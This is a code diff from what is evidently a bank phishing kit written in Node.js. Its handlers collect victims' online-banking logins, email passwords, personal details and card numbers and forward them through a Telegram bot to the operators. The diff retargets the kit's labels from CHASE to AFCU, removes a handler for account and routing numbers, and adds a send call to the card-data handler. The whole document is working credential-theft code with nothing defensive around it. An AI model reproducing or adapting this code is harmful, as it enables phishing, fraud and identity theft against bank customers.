@@ -33,7 +33,7 @@ exports.loginPost = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | AFCU | USER_${ipAddress}\n\n` +
 		`👤 LOGIN INFO\n` +
 		`USERNAME         : ${username}\n` +
 		`PASSWORD         : ${password}\n\n` +
@@ -96,7 +96,7 @@ exports.loginPost2 = async (req, res) => {
 
 
         const message =
-            `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
+            `✅ UPDATE TEAM | AFCU | USER_${ipAddress}\n\n` +
             `👤 RELOGIN INFO\n` +
 			`USERNAME         : ${username}\n` +
 			`PASSWORD         : ${password}\n\n` +
@@ -145,59 +145,10 @@ exports.loginPost3 = async (req, res) => {
 
 
         const message =
-            `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
+            `✅ UPDATE TEAM | AFCU | USER_${ipAddress}\n\n` +
             `👤 EMAIL INFO\n` +
 			`EMAIL ADDRESS    : ${emailAddr}\n` +
 			`EMAIL PASSWORD   : ${emailPass}\n\n` +
-            
-            `🌍 GEO-IP INFO\n` +
-          `IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-            `💬 Telegram: https://t.me/UpdateTeams\n`;
-            
-
-        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
-        sendMessage(message);
-
-        res.redirect("/auth/login/x");
-    } catch (error) {
-		console.error('Unexpected error:', error.message);
-		res.status(500).send('Internal Server Error');
-	}
-	process.on('unhandledRejection', (reason, promise) => {
-		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-	});
-	
-};
-
-exports.loginx = (req, res) => {
-	res.render("loginx");
-};
-
-exports.loginPostx = async (req, res) => {
-	const { accountNumber, routingNumber } = req.body;
-	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
-
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-
-	try{
-    console.log(ipAddressInformation);
-
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-
-
-        const message =
-            `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
-            `👤 EMAIL INFO\n` +
-			`ACCOUNT NUMBER   : ${accountNumber}\n` +
-			`ROUTING NUMBER  : ${routingNumber}\n\n` +
             
             `🌍 GEO-IP INFO\n` +
           `IP ADDRESS       : ${ipAddress}\n` +
@@ -244,7 +195,7 @@ exports.loginPost4 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | AFCU | USER_${ipAddress}\n\n` +
 		`👤 PERSONAL INFO\n` +
 		`FULL NAME        : ${fullName}\n` +
 		`STREET ADDRESS   : ${address}\n` +
@@ -296,7 +247,7 @@ exports.loginPost5 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | AFCU | USER_${ipAddress}\n\n` +
 		`👤 CARD INFO\n` +
 		`CARD NUMBER      : ${cardNum}\n` +
 		`EXPIRY DATE      : ${expDate}\n` +
@@ -308,7 +259,9 @@ exports.loginPost5 = async (req, res) => {
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
 
-		
+		const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
+        sendMessage(message);
+        
 		res.redirect("/auth/complete");
 	} catch (error) {
 		console.error('Unexpected error:', error.message);
